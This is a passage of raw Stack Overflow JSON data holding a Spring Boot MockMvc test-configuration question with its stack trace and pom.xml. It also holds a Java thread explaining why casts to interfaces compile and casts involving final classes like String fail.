org.springframework.test.context.junit.jupiter.SpringExtension.postProcessTestInstance(SpringExtension.java:138)\n        at org.junit.jupiter.engine.descriptor.ClassBasedTestDescriptor.lambda$invokeTestInstancePostProcessors$10(ClassBasedTestDescriptor.java:377)\n        at org.junit.jupiter.engine.descriptor.ClassBasedTestDescriptor.executeAndMaskThrowable(ClassBasedTestDescriptor.java:382)\n        at org.junit.jupiter.engine.descriptor.ClassBasedTestDescriptor.lambda$invokeTestInstancePostProcessors$11(ClassBasedTestDescriptor.java:377)\n        at java.base/java.util.stream.ReferencePipeline$3$1.accept(ReferencePipeline.java:197)\n        at java.base/java.util.stream.ReferencePipeline$2$1.accept(ReferencePipeline.java:179)\n        at java.base/java.util.ArrayList$ArrayListSpliterator.forEachRemaining(ArrayList.java:1625)\n        at java.base/java.util.stream.AbstractPipeline.copyInto(AbstractPipeline.java:509)\n        at java.base/java.util.stream.AbstractPipeline.wrapAndCopyInto(AbstractPipeline.java:499)\n        at java.base/java.util.stream.StreamSpliterators$WrappingSpliterator.forEachRemaining(StreamSpliterators.java:310)\n        at java.base/java.util.stream.Streams$ConcatSpliterator.forEachRemaining(Streams.java:735)\n        at java.base/java.util.stream.Streams$ConcatSpliterator.forEachRemaining(Streams.java:734)\n        at java.base/java.util.stream.ReferencePipeline$Head.forEach(ReferencePipeline.java:762)\n        at org.junit.jupiter.engine.descriptor.ClassBasedTestDescriptor.invokeTestInstancePostProcessors(ClassBasedTestDescriptor.java:376)\n        at org.junit.jupiter.engine.descriptor.ClassBasedTestDescriptor.lambda$instantiateAndPostProcessTestInstance$6(ClassBasedTestDescriptor.java:289)\n        at org.junit.platform.engine.support.hierarchical.ThrowableCollector.execute(ThrowableCollector.java:73)\n        at org.junit.jupiter.engine.descriptor.ClassBasedTestDescriptor.instantiateAndPostProcessTestInstance(ClassBasedTestDescriptor.java:288)\n        at org.junit.jupiter.engine.descriptor.ClassBasedTestDescriptor.lambda$testInstancesProvider$4(ClassBasedTestDescriptor.java:278)\n        at java.base/java.util.Optional.orElseGet(Optional.java:364)\n        at org.junit.jupiter.engine.descriptor.ClassBasedTestDescriptor.lambda$testInstancesProvider$5(ClassBasedTestDescriptor.java:277)\n        at org.junit.jupiter.engine.execution.TestInstancesProvider.getTestInstances(TestInstancesProvider.java:31)\n        at org.junit.jupiter.engine.descriptor.TestMethodTestDescriptor.lambda$prepare$0(TestMethodTestDescriptor.java:105)\n        at org.junit.platform.engine.support.hierarchical.ThrowableCollector.execute(ThrowableCollector.java:73)\n        at org.junit.jupiter.engine.descriptor.TestMethodTestDescriptor.prepare(TestMethodTestDescriptor.java:104)\n        at org.junit.jupiter.engine.descriptor.TestMethodTestDescriptor.prepare(TestMethodTestDescriptor.java:68)\n        at org.junit.platform.engine.support.hierarchical.NodeTestTask.lambda$prepare$2(NodeTestTask.java:123)\n        at org.junit.platform.engine.support.hierarchical.ThrowableCollector.execute(ThrowableCollector.java:73)\n        at org.junit.platform.engine.support.hierarchical.NodeTestTask.prepare(NodeTestTask.java:123)\n        at org.junit.platform.engine.support.hierarchical.NodeTestTask.execute(NodeTestTask.java:90)\n        at java.base/java.util.ArrayList.forEach(ArrayList.java:1511)\n        at org.junit.platform.engine.support.hierarchical.SameThreadHierarchicalTestExecutorService.invokeAll(SameThreadHierarchicalTestExecutorService.java:41)\n        at org.junit.platform.engine.support.hierarchical.NodeTestTask.lambda$executeRecursively$6(NodeTestTask.java:155)\n        at org.junit.platform.engine.support.hierarchical.ThrowableCollector.execute(ThrowableCollector.java:73)\n        at org.junit.platform.engine.support.hierarchical.NodeTestTask.lambda$executeRecursively$8(NodeTestTask.java:141)\n        at org.junit.platform.engine.support.hierarchical.Node.around(Node.java:137)\n        at org.junit.platform.engine.support.hierarchical.NodeTestTask.lambda$executeRecursively$9(NodeTestTask.java:139)\n        at org.junit.platform.engine.support.hierarchical.ThrowableCollector.execute(ThrowableCollector.java:73)\n        at org.junit.platform.engine.support.hierarchical.NodeTestTask.executeRecursively(NodeTestTask.java:138)\n        at org.junit.platform.engine.support.hierarchical.NodeTestTask.execute(NodeTestTask.java:95)\n        at java.base/java.util.ArrayList.forEach(ArrayList.java:1511)\n        at org.junit.platform.engine.support.hierarchical.SameThreadHierarchicalTestExecutorService.invokeAll(SameThreadHierarchicalTestExecutorService.java:41)\n        at org.junit.platform.engine.support.hierarchical.NodeTestTask.lambda$executeRecursively$6(NodeTestTask.java:155)\n        at org.junit.platform.engine.support.hierarchical.ThrowableCollector.execute(ThrowableCollector.java:73)\n        at org.junit.platform.engine.support.hierarchical.NodeTestTask.lambda$executeRecursively$8(NodeTestTask.java:141)\n        at org.junit.platform.engine.support.hierarchical.Node.around(Node.java:137)\n        at org.junit.platform.engine.support.hierarchical.NodeTestTask.lambda$executeRecursively$9(NodeTestTask.java:139)\n        at org.junit.platform.engine.support.hierarchical.ThrowableCollector.execute(ThrowableCollector.java:73)\n        at org.junit.platform.engine.support.hierarchical.NodeTestTask.executeRecursively(NodeTestTask.java:138)\n        at org.junit.platform.engine.support.hierarchical.NodeTestTask.execute(NodeTestTask.java:95)\n        at org.junit.platform.engine.support.hierarchical.SameThreadHierarchicalTestExecutorService.submit(SameThreadHierarchicalTestExecutorService.java:35)\n        at org.junit.platform.engine.support.hierarchical.HierarchicalTestExecutor.execute(HierarchicalTestExecutor.java:57)\n        at org.junit.platform.engine.support.hierarchical.HierarchicalTestEngine.execute(HierarchicalTestEngine.java:54)\n        at org.junit.platform.launcher.core.EngineExecutionOrchestrator.execute(EngineExecutionOrchestrator.java:147)\n        at org.junit.platform.launcher.core.EngineExecutionOrchestrator.execute(EngineExecutionOrchestrator.java:127)\n        at org.junit.platform.launcher.core.EngineExecutionOrchestrator.execute(EngineExecutionOrchestrator.java:90)\n        at org.junit.platform.launcher.core.EngineExecutionOrchestrator.lambda$execute$0(EngineExecutionOrchestrator.java:55)\n        at org.junit.platform.launcher.core.EngineExecutionOrchestrator.withInterceptedStreams(EngineExecutionOrchestrator.java:102)\n        at org.junit.platform.launcher.core.EngineExecutionOrchestrator.execute(EngineExecutionOrchestrator.java:54)\n        at org.junit.platform.launcher.core.DefaultLauncher.execute(DefaultLauncher.java:114)\n        at org.junit.platform.launcher.core.DefaultLauncher.execute(DefaultLauncher.java:86)\n        at org.junit.platform.launcher.core.DefaultLauncherSession$DelegatingLauncher.execute(DefaultLauncherSession.java:86)\n        at org.junit.platform.launcher.core.SessionPerRequestLauncher.execute(SessionPerRequestLauncher.java:53)\n        at com.intellij.junit5.JUnit5IdeaTestRunner.startRunnerWithArgs(JUnit5IdeaTestRunner.java:57)\n        at com.intellij.rt.junit.IdeaTestRunner$Repeater$1.execute(IdeaTestRunner.java:38)\n        at com.intellij.rt.execution.junit.TestsRepeater.repeat(TestsRepeater.java:11)\n        at com.intellij.rt.junit.IdeaTestRunner$Repeater.startRunnerWithArgs(IdeaTestRunner.java:35)\n        at com.intellij.rt.junit.JUnitStarter.prepareStreamsAndStart(JUnitStarter.java:232)\n        at com.intellij.rt.junit.JUnitStarter.main(JUnitStarter.java:55)\n        Caused by: org.springframework.beans.factory.NoSuchBeanDefinitionException: No qualifying bean of type 'org.springframework.test.web.servlet.MockMvc' available: expected at least 1 bean which qualifies as autowire candidate. Dependency annotations: {@org.springframework.beans.factory.annotation.Autowired(required=true)}\n        at org.springframework.beans.factory.support.DefaultListableBeanFactory.raiseNoMatchingBeanFound(DefaultListableBeanFactory.java:1824)\n        at org.springframework.beans.factory.support.DefaultListableBeanFactory.doResolveDependency(DefaultListableBeanFactory.java:1383)\n        at org.springframework.beans.factory.support.DefaultListableBeanFactory.resolveDependency(DefaultListableBeanFactory.java:1337)\n        at org.springframework.beans.factory.annotation.AutowiredAnnotationBeanPostProcessor$AutowiredFieldElement.resolveFieldValue(AutowiredAnnotationBeanPostProcessor.java:710)\n        ... 76 more\n</code></pre>\n<p>For my basic test. I do not have this issue for a similar project using Spring Boot 3 so I do not see what I am doing differently here. Any idea ?</p>\n<pre><code>   import org.junit.jupiter.api.Test;\nimport org.springframework.beans.factory.annotation.Autowired;\nimport org.springframework.boot.test.autoconfigure.web.servlet.AutoConfigureMockMvc;\nimport org.springframework.boot.test.context.SpringBootTest;\nimport org.springframework.test.web.servlet.MockMvc;\n\nimport static org.springframework.test.web.servlet.request.MockMvcRequestBuilders.get;\nimport static org.springframework.test.web.servlet.result.MockMvcResultMatchers.status;\n\n@SpringBootTest\n@AutoConfigureMockMvc\npublic class FooTest {\n\n    @Autowired\n    private MockMvc mvc;\n\n    @Test\n    void test() throws Exception{\n        mvc.perform(get(&quot;/foo&quot;)).andExpect(status().isOk());\n    }\n}\n</code></pre>\n<p>and my full pom has the following</p>\n<pre><code> &lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;\n&lt;project xmlns=&quot;http://maven.apache.org/POM/4.0.0&quot; xmlns:xsi=&quot;http://www.w3.org/2001/XMLSchema-instance&quot;\n         xsi:schemaLocation=&quot;http://maven.apache.org/POM/4.0.0 https://maven.apache.org/xsd/maven-4.0.0.xsd&quot;&gt;\n    &lt;modelVersion&gt;4.0.0&lt;/modelVersion&gt;\n\n    &lt;parent&gt;\n        &lt;groupId&gt;org.springframework.boot&lt;/groupId&gt;\n        &lt;artifactId&gt;spring-boot-starter-parent&lt;/artifactId&gt;\n        &lt;version&gt;3.0.6&lt;/version&gt;\n        &lt;relativePath/&gt;\n    &lt;/parent&gt;\n\n    &lt;groupId&gt;com.foo&lt;/groupId&gt;\n    &lt;artifactId&gt;bar-parent&lt;/artifactId&gt;\n    &lt;version&gt;1.0&lt;/version&gt;\n    &lt;name&gt;foo-bar-parent&lt;/name&gt;\n\n    &lt;properties&gt;\n        &lt;java.version&gt;17&lt;/java.version&gt;\n\n        &lt;spring-cloud.version&gt;2022.0.2&lt;/spring-cloud.version&gt;\n        &lt;spring-cloud-gcp.version&gt;4.3.0&lt;/spring-cloud-gcp.version&gt;\n        &lt;maven-jar-plugin.version&gt;3.3.0&lt;/maven-jar-plugin.version&gt;\n        &lt;maven-source-plugin.version&gt;3.2.1&lt;/maven-source-plugin.version&gt;\n\n        &lt;!-- Plugin version --&gt;\n        &lt;sonar.moduleKey&gt;${project.artifactId}&lt;/sonar.moduleKey&gt;\n        &lt;sonar.version&gt;3.9.1.2184&lt;/sonar.version&gt;\n        &lt;fmt-maven.version&gt;2.20&lt;/fmt-maven.version&gt;\n        &lt;spotify-docker-maven.version&gt;1.4.13&lt;/spotify-docker-maven.version&gt;\n        &lt;surefire.version&gt;3.0.0&lt;/surefire.version&gt;\n        &lt;docker.image.repo&gt;eu.gcr.io/docker-registry-shared-cc74&lt;/docker.image.repo&gt;\n    &lt;/properties&gt;\n\n    &lt;dependencyManagement&gt;\n        &lt;dependencies&gt;\n            &lt;dependency&gt;\n                &lt;groupId&gt;org.springframework.boot&lt;/groupId&gt;\n                &lt;artifactId&gt;spring-boot-dependencies&lt;/artifactId&gt;\n                &lt;version&gt;3.0.6&lt;/version&gt;\n                &lt;scope&gt;import&lt;/scope&gt;\n                &lt;type&gt;pom&lt;/type&gt;\n            &lt;/dependency&gt;\n            &lt;dependency&gt;\n                &lt;groupId&gt;org.springframework.cloud&lt;/groupId&gt;\n                &lt;artifactId&gt;spring-cloud-dependencies&lt;/artifactId&gt;\n                &lt;version&gt;${spring-cloud.version}&lt;/version&gt;\n                &lt;type&gt;pom&lt;/type&gt;\n                &lt;scope&gt;import&lt;/scope&gt;\n            &lt;/dependency&gt;\n        &lt;/dependencies&gt;\n    &lt;/dependencyManagement&gt;\n\n    &lt;dependencies&gt;\n        &lt;!-- Google Cloud Dependencies --&gt;\n        &lt;dependency&gt;\n            &lt;groupId&gt;org.springframework.cloud&lt;/groupId&gt;\n            &lt;artifactId&gt;spring-cloud-dependencies&lt;/artifactId&gt;\n            &lt;version&gt;${spring-cloud.version}&lt;/version&gt;\n            &lt;type&gt;pom&lt;/type&gt;\n        &lt;/dependency&gt;\n        &lt;dependency&gt;\n            &lt;groupId&gt;com.google.cloud&lt;/groupId&gt;\n            &lt;artifactId&gt;spring-cloud-gcp-dependencies&lt;/artifactId&gt;\n            &lt;version&gt;${spring-cloud-gcp.version}&lt;/version&gt;\n            &lt;type&gt;pom&lt;/type&gt;\n        &lt;/dependency&gt;\n\n        &lt;dependency&gt;\n            &lt;groupId&gt;org.springframework.boot&lt;/groupId&gt;\n            &lt;artifactId&gt;spring-boot-starter-web&lt;/artifactId&gt;\n        &lt;/dependency&gt;\n        &lt;dependency&gt;\n            &lt;groupId&gt;org.springframework.boot&lt;/groupId&gt;\n            &lt;artifactId&gt;spring-boot-starter-security&lt;/artifactId&gt;\n        &lt;/dependency&gt;\n        &lt;dependency&gt;\n            &lt;groupId&gt;org.springframework.boot&lt;/groupId&gt;\n            &lt;artifactId&gt;spring-boot-starter-webflux&lt;/artifactId&gt;\n        &lt;/dependency&gt;\n        &lt;dependency&gt;\n            &lt;groupId&gt;org.springframework.cloud&lt;/groupId&gt;\n            &lt;artifactId&gt;spring-cloud-starter-gateway&lt;/artifactId&gt;\n        &lt;/dependency&gt;\n        &lt;dependency&gt;\n            &lt;groupId&gt;org.projectlombok&lt;/groupId&gt;\n            &lt;artifactId&gt;lombok&lt;/artifactId&gt;\n            &lt;optional&gt;true&lt;/optional&gt;\n        &lt;/dependency&gt;\n        &lt;dependency&gt;\n            &lt;groupId&gt;org.springframework.boot&lt;/groupId&gt;\n            &lt;artifactId&gt;spring-boot-starter-data-jpa&lt;/artifactId&gt;\n        &lt;/dependency&gt;\n\n        &lt;dependency&gt;\n            &lt;groupId&gt;org.springframework.boot&lt;/groupId&gt;\n            &lt;artifactId&gt;spring-boot-starter-actuator&lt;/artifactId&gt;\n        &lt;/dependency&gt;\n        &lt;dependency&gt;\n            &lt;groupId&gt;io.micrometer&lt;/groupId&gt;\n            &lt;artifactId&gt;micrometer-core&lt;/artifactId&gt;\n        &lt;/dependency&gt;\n        &lt;dependency&gt;\n            &lt;groupId&gt;io.micrometer&lt;/groupId&gt;\n            &lt;artifactId&gt;micrometer-registry-prometheus&lt;/artifactId&gt;\n        &lt;/dependency&gt;\n        &lt;dependency&gt;\n            &lt;groupId&gt;org.springdoc&lt;/groupId&gt;\n            &lt;artifactId&gt;springdoc-openapi-starter-webmvc-ui&lt;/artifactId&gt;\n            &lt;version&gt;2.1.0&lt;/version&gt;\n        &lt;/dependency&gt;\n        &lt;dependency&gt;\n            &lt;groupId&gt;org.springdoc&lt;/groupId&gt;\n            &lt;artifactId&gt;springdoc-openapi-ui&lt;/artifactId&gt;\n            &lt;version&gt;1.7.0&lt;/version&gt;\n        &lt;/dependency&gt;\n\n        &lt;!-- Testing Dependencies --&gt;\n        &lt;dependency&gt;\n            &lt;groupId&gt;org.springframework.boot&lt;/groupId&gt;\n            &lt;artifactId&gt;spring-boot-starter-test&lt;/artifactId&gt;\n            &lt;scope&gt;test&lt;/scope&gt;\n        &lt;/dependency&gt;\n        &lt;dependency&gt;\n            &lt;groupId&gt;io.projectreactor&lt;/groupId&gt;\n            &lt;artifactId&gt;reactor-test&lt;/artifactId&gt;\n            &lt;scope&gt;test&lt;/scope&gt;\n        &lt;/dependency&gt;\n        &lt;dependency&gt;\n            &lt;groupId&gt;org.springframework.security&lt;/groupId&gt;\n            &lt;artifactId&gt;spring-security-test&lt;/artifactId&gt;\n            &lt;scope&gt;test&lt;/scope&gt;\n        &lt;/dependency&gt;\n    &lt;/dependencies&gt;\n\n    &lt;build&gt;\n        &lt;plugins&gt;\n          &lt;plugin&gt;\n            &lt;groupId&gt;org.springframework.boot&lt;/groupId&gt;\n            &lt;artifactId&gt;spring-boot-maven-plugin&lt;/artifactId&gt;\n            &lt;version&gt;3.0.6&lt;/version&gt;\n            &lt;configuration&gt;\n                &lt;excludes&gt;\n                    &lt;exclude&gt;\n                        &lt;groupId&gt;org.projectlombok&lt;/groupId&gt;\n                        &lt;artifactId&gt;lombok&lt;/artifactId&gt;\n                    &lt;/exclude&gt;\n                &lt;/excludes&gt;\n            &lt;/configuration&gt;\n        &lt;/plugin&gt;\n            &lt;plugin&gt;\n                &lt;groupId&gt;org.apache.maven.plugins&lt;/groupId&gt;\n                &lt;artifactId&gt;maven-compiler-plugin&lt;/artifactId&gt;\n                &lt;configuration&gt;\n                    &lt;source&gt;${java.version}&lt;/source&gt;\n                    &lt;target&gt;${java.version}&lt;/target&gt;\n                &lt;/configuration&gt;\n            &lt;/plugin&gt;\n            &lt;plugin&gt;\n                &lt;groupId&gt;org.springframework.boot&lt;/groupId&gt;\n                &lt;artifactId&gt;spring-boot-maven-plugin&lt;/artifactId&gt;\n                &lt;configuration&gt;\n                    &lt;excludes&gt;\n                        &lt;exclude&gt;\n                            &lt;groupId&gt;org.projectlombok&lt;/groupId&gt;\n                            &lt;artifactId&gt;lombok&lt;/artifactId&gt;\n                        &lt;/exclude&gt;\n                    &lt;/excludes&gt;\n                &lt;/configuration&gt;\n            &lt;/plugin&gt;\n            &lt;plugin&gt;\n                &lt;groupId&gt;com.spotify.fmt&lt;/groupId&gt;\n                &lt;artifactId&gt;fmt-maven-plugin&lt;/artifactId&gt;\n                &lt;version&gt;${fmt-maven.version}&lt;/version&gt;\n            &lt;/plugin&gt;\n            &lt;plugin&gt;\n                &lt;groupId&gt;org.apache.maven.plugins&lt;/groupId&gt;\n                &lt;artifactId&gt;maven-deploy-plugin&lt;/artifactId&gt;\n                &lt;executions&gt;\n                    &lt;execution&gt;\n                        &lt;id&gt;default-deploy&lt;/id&gt;\n                        &lt;phase&gt;none&lt;/phase&gt;\n                    &lt;/execution&gt;\n                &lt;/executions&gt;\n            &lt;/plugin&gt;\n            &lt;plugin&gt;\n                &lt;groupId&gt;org.sonarsource.scanner.maven&lt;/groupId&gt;\n                &lt;artifactId&gt;sonar-maven-plugin&lt;/artifactId&gt;\n                &lt;version&gt;${sonar.version}&lt;/version&gt;\n            &lt;/plugin&gt;\n            &lt;plugin&gt;\n                &lt;groupId&gt;org.apache.maven.plugins&lt;/groupId&gt;\n                &lt;artifactId&gt;maven-surefire-plugin&lt;/artifactId&gt;\n                &lt;version&gt;${surefire.version}&lt;/version&gt;\n            &lt;/plugin&gt;\n            &lt;plugin&gt;\n                &lt;groupId&gt;org.apache.maven.plugins&lt;/groupId&gt;\n                &lt;artifactId&gt;maven-failsafe-plugin&lt;/artifactId&gt;\n            &lt;/plugin&gt;\n            &lt;plugin&gt;\n                &lt;groupId&gt;org.apache.maven.plugins&lt;/groupId&gt;\n                &lt;artifactId&gt;maven-jar-plugin&lt;/artifactId&gt;\n                &lt;version&gt;${maven-jar-plugin.version}&lt;/version&gt;\n                &lt;configuration&gt;\n                    &lt;archive&gt;\n                        &lt;compress&gt;false&lt;/compress&gt;\n                    &lt;/archive&gt;\n                &lt;/configuration&gt;\n            &lt;/plugin&gt;\n            &lt;plugin&gt;\n                &lt;groupId&gt;org.apache.maven.plugins&lt;/groupId&gt;\n                &lt;artifactId&gt;maven-source-plugin&lt;/artifactId&gt;\n                &lt;version&gt;${maven-source-plugin.version}&lt;/version&gt;\n                &lt;executions&gt;\n                    &lt;execution&gt;\n                        &lt;id&gt;attach-sources&lt;/id&gt;\n                        &lt;goals&gt;\n                            &lt;goal&gt;jar&lt;/goal&gt;\n                        &lt;/goals&gt;\n                    &lt;/execution&gt;\n                &lt;/executions&gt;\n            &lt;/plugin&gt;\n        &lt;/plugins&gt;\n    &lt;/build&gt;\n\n&lt;/project&gt;\n</code></pre>\n"},{"tags":["java","inheritance","casting","classcastexception"],"comments":[{"owner":{"account_id":284109,"reputation":47153,"user_id":581994,"accept_rate":57,"display_name":"Hot Licks"},"score":0,"creation_date":1384132567,"post_id":19895304,"comment_id":29601901,"body_markdown":"The compiler knows that String is `final` and hence there&#39;s no way that a subclass of String could be Roamable.","body":"The compiler knows that String is <code>final</code> and hence there&#39;s no way that a subclass of String could be Roamable."},{"owner":{"account_id":543250,"reputation":18874,"user_id":912319,"accept_rate":62,"display_name":"Kanagavelu Sugumar"},"score":0,"creation_date":1463064389,"post_id":19895304,"comment_id":61913374,"body_markdown":"This is a very nice question blocking my head for long time :)","body":"This is a very nice question blocking my head for long time :)"}],"answers":[{"tags":[],"owner":{"account_id":1423067,"reputation":30040,"user_id":1347281,"accept_rate":86,"display_name":"Vidya"},"down_vote_count":0,"up_vote_count":1,"is_accepted":false,"score":1,"last_activity_date":1384118490,"creation_date":1384118490,"answer_id":19895340,"question_id":19895304,"body_markdown":"The code compiles because the compiler lets you cast to anything. It is an explicit action by the programmer, and the compiler assumes you have assessed the risks and taken the appropriate precautions.\r\n\r\n`String` is not an instance of `Roamable`, so you cannot assign an instance of `String` to a `Roamable` reference. And that can be determined at compile time, so it fails.","title":"ClassCastException vs. &quot;cannot cast&quot; compilation error","body":"<p>The code compiles because the compiler lets you cast to anything. It is an explicit action by the programmer, and the compiler assumes you have assessed the risks and taken the appropriate precautions.</p>\n\n<p><code>String</code> is not an instance of <code>Roamable</code>, so you cannot assign an instance of <code>String</code> to a <code>Roamable</code> reference. And that can be determined at compile time, so it fails.</p>\n"},{"tags":[],"owner":{"account_id":2437284,"reputation":3902,"user_id":2126854,"accept_rate":80,"display_name":"Glenn Lane"},"down_vote_count":0,"up_vote_count":1,"is_accepted":false,"score":1,"last_activity_date":1384118504,"creation_date":1384118504,"answer_id":19895342,"question_id":19895304,"body_markdown":"`new Phone()` evals into class `Phone`, which _could_ be an extension of `Phone` that implements `Roamable` (as far as the compiler is concerned).\r\n\r\nIf you made Phone a `final` class (like String), you will get the compiler error.","title":"ClassCastException vs. &quot;cannot cast&quot; compilation error","body":"<p><code>new Phone()</code> evals into class <code>Phone</code>, which <em>could</em> be an extension of <code>Phone</code> that implements <code>Roamable</code> (as far as the compiler is concerned).</p>\n\n<p>If you made Phone a <code>final</code> class (like String), you will get the compiler error.</p>\n"},{"tags":[],"owner":{"account_id":541997,"reputation":7814,"user_id":910736,"display_name":"JamesB"},"down_vote_count":0,"up_vote_count":4,"is_accepted":false,"score":4,"last_activity_date":1384118643,"creation_date":1384118643,"answer_id":19895368,"question_id":19895304,"body_markdown":"String is final so there is no way it can be cast to a Roamable.","title":"ClassCastException vs. &quot;cannot cast&quot; compilation error","body":"<p>String is final so there is no way it can be cast to a Roamable.</p>\n"},{"tags":[],"owner":{"account_id":1202808,"reputation":15318,"user_id":1173114,"display_name":"Sage"},"down_vote_count":0,"up_vote_count":14,"is_accepted":true,"score":14,"last_activity_date":1384195590,"creation_date":1384119579,"answer_id":19895533,"question_id":19895304,"body_markdown":"&gt; Why does the code above compile at all? Phone seems unrelated to\r\n&gt; Roamable to me?\r\n\r\nyes because `Roamable` is an interface it might cause a Run-time exception but not compile time exception, because even if `Phone` doesn&#39;t implement `Roamable`, a subclass of `Phone` might, hence the compiler has no way to know it but at the Run time. \r\n\r\nIt is already defined in java language specification. [**Check out my answer here**][1].\r\n\r\n&gt; Why does the code compile with new Phone(), but doesn&#39;t it compile\r\n&gt; with new String()?\r\n\r\nBecause `class String` is declared as `public final class` in `java.lang` package. As specified in [**`jls 8.1.1.2 final class`**][2] section: a class declared as `final` can&#39;t  be extended and hence it won&#39;t have any subclass. So, the compiler already knows that `String` can&#39;t be extended: hence no subclass&#39;s existence is possible to implement *interface* `Roamable`\r\n\r\n**Edit: (With response to your below comment)**\r\n\r\nLet us assume that `B` is a subclass of `A` which implements an interface `T`. \r\n\r\nNow an statement : \r\n\r\n       T t = (T)new A();\r\n\r\nis essentially same as: \r\n   \r\n       A aObj = new A() ;\r\n       T t = (T)aObj ; // a run-time exception happen\r\n\r\nbefore running into conclusion, let us do the same thing with an object of `B`:\r\n\r\n       A aObj = new B();\r\n       T t = (T)aObj; // no exception happen.\r\n\r\nso, the real reason with super class and sub class here is the reference. The `aObj` class in this second code example is also an instance of class `A` but it is also an instance of class `B` which has implemented `T`.\r\n\r\n  [1]: https://stackoverflow.com/questions/19824941/why-does-it-compile-when-casting-to-an-unrelated-interface/19825137#19825137\r\n  [2]: http://docs.oracle.com/javase/specs/jls/se7/html/jls-8.html#jls-8.1.1.2","title":"ClassCastException vs. &quot;cannot cast&quot; compilation error","body":"<blockquote>\n  <p>Why does the code above compile at all? Phone seems unrelated to\n  Roamable to me?</p>\n</blockquote>\n\n<p>yes because <code>Roamable</code> is an interface it might cause a Run-time exception but not compile time exception, because even if <code>Phone</code> doesn't implement <code>Roamable</code>, a subclass of <code>Phone</code> might, hence the compiler has no way to know it but at the Run time. </p>\n\n<p>It is already defined in java language specification. <a href=\"https://stackoverflow.com/questions/19824941/why-does-it-compile-when-casting-to-an-unrelated-interface/19825137#19825137\"><strong>Check out my answer here</strong></a>.</p>\n\n<blockquote>\n  <p>Why does the code compile with new Phone(), but doesn't it compile\n  with new String()?</p>\n</blockquote>\n\n<p>Because <code>class String</code> is declared as <code>public final class</code> in <code>java.lang</code> package. As specified in <a href=\"http://docs.oracle.com/javase/specs/jls/se7/html/jls-8.html#jls-8.1.1.2\" rel=\"nofollow noreferrer\"><strong><code>jls 8.1.1.2 final class</code></strong></a> section: a class declared as <code>final</code> can't  be extended and hence it won't have any subclass. So, the compiler already knows that <code>String</code> can't be extended: hence no subclass's existence is possible to implement <em>interface</em> <code>Roamable</code></p>\n\n<p><strong>Edit: (With response to your below comment)</strong></p>\n\n<p>Let us assume that <code>B</code> is a subclass of <code>A</code> which implements an interface <code>T</code>. </p>\n\n<p>Now an statement : </p>\n\n<pre><code>   T t = (T)new A();\n</code></pre>\n\n<p>is essentially same as: </p>\n\n<pre><code>   A aObj = new A() ;\n   T t = (T)aObj ; // a run-time exception happen\n</code></pre>\n\n<p>before running into conclusion, let us do the same thing with an object of <code>B</code>:</p>\n\n<pre><code>   A aObj = new B();\n   T t = (T)aObj; // no exception happen.\n</code></pre>\n\n<p>so, the real reason with super class and sub class here is the reference. The <code>aObj</code> class in this second code example is also an instance of class <code>A</code> but it is also an instance of class <code>B</code> which has implemented <code>T</code>.</p>\n"},{"tags":[],"owner":{"account_id":2478127,"reputation":19514,"user_id":2158288,"display_name":"ZhongYu"},"down_vote_count":1,"up_vote_count":1,"is_accepted":false,"score":0,"last_activity_date":1384129381,"creation_date":1384129381,"answer_id":19897009,"question_id":19895304,"body_markdown":"A good question. `new Phone()` is definitely not any subclass of `Phone`. However that information is lost, javac sees a `Phone` type there, not the *exact* `Phone` type.\r\n\r\nRelevant spec: http://docs.oracle.com/javase/specs/jls/se7/html/jls-5.html#jls-5.5.1 \r\n&gt; If S is a final class (&#167;8.1.1), then S must implement T,\r\n\r\nThe spec can be amended with\r\n\r\n&gt; If the expression is a Class Instance Creation Expression (&#167;15.9), the type of the expression must be a subtype of T.","title":"ClassCastException vs. &quot;cannot cast&quot; compilation error","body":"<p>A good question. <code>new Phone()</code> is definitely not any subclass of <code>Phone</code>. However that information is lost, javac sees a <code>Phone</code> type there, not the <em>exact</em> <code>Phone</code> type.</p>\n\n<p>Relevant spec: <a href=\"http://docs.oracle.com/javase/specs/jls/se7/html/jls-5.html#jls-5.5.1\" rel=\"nofollow\">http://docs.oracle.com/javase/specs/jls/se7/html/jls-5.html#jls-5.5.1</a> </p>\n\n<blockquote>\n  <p>If S is a final class (§8.1.1), then S must implement T,</p>\n</blockquote>\n\n<p>The spec can be amended with</p>\n\n<blockquote>\n  <p>If the expression is a Class Instance Creation Expression (§15.9), the type of the expression must be a subtype of T.</p>\n</blockquote>\n"},{"tags":[],"owner":{"account_id":543250,"reputation":18874,"user_id":912319,"accept_rate":62,"display_name":"Kanagavelu Sugumar"},"down_vote_count":0,"up_vote_count":0,"is_accepted":false,"score":0,"last_activity_date":1465213812,"creation_date":1463065561,"answer_id":37190861,"question_id":19895304,"body_markdown":"First read about [Explicit and Implicit type casting][1] by java. &lt;BR&gt;&lt;BR&gt;\r\nFrom that user is responsible for explicit casting when narrowing down the object relationship to say that user knows and fine with they loose some precision because of this. However still compiler can detect some explicit wrong casting and throw `CE: Type mismatch error` at some point. Beyond that point it is up to runtime `ClassCastException` to deal with it.\r\n\r\n&gt; Compiler can detect the following cases of explicit casting.\r\n\r\n    class A {}\r\n    class B {}\r\n    \r\n    A a = (A) new B(); //CE: Type mismatch: cannot convert from B to A\r\n    B b = (B) new A(); //compilation error (CE)\r\n\r\n---\r\n\r\n    interface I {}\r\n    final class A {}\r\n    I i = (I) new A();  //compilation error\r\n\r\n---\r\n&gt; Compiler can not detect the following cases of explicit casting.\r\n\r\n    class A {}\r\n    class B extends A {}\r\n    A a = (A) new B(); //Fine\r\n    B b = (B) new A(); //Runtime error; because compile time;\r\n                       //compiler wont be able to tell the reference is instance of A or B.\r\n                       //means this is something like below. &lt;BR&gt;\r\n    B b = (B) (A) new A();\r\n\r\n---\r\n\r\nAny Object can be caste to any interface without compilation error.\r\n\r\n    interface I {}\r\n    class A {}\r\n    class B extends A implements I{}\r\n\r\n    I i = (I) new A();  //Runtime error\r\n    I i = (I) new B();  //Fine\r\n\r\n\r\n---\r\nhttps://stackoverflow.com/questions/1495308/why-does-this-compile &lt;BR&gt;\r\n\r\nReference of interfaces can castes to any object without compilation error.\r\n \r\n    interface I {}\r\n    class A implements I {}\r\n    class B {}\r\n\r\n    B b = (B) getI();     //Runtime error\r\n    OR \r\n    B b = (B)(I)new A();  //Runtime error\r\n\r\n    public I getI() {\r\n\t return new A();\r\n    }\r\n\r\n\r\n  [1]: http://www.javainterviewpoint.com/type-casting-java-implicit-explicit-casting/","title":"ClassCastException vs. &quot;cannot cast&quot; compilation error","body":"<p>First read about <a href=\"http://www.javainterviewpoint.com/type-casting-java-implicit-explicit-casting/\" rel=\"nofollow noreferrer\">Explicit and Implicit type casting</a> by java. 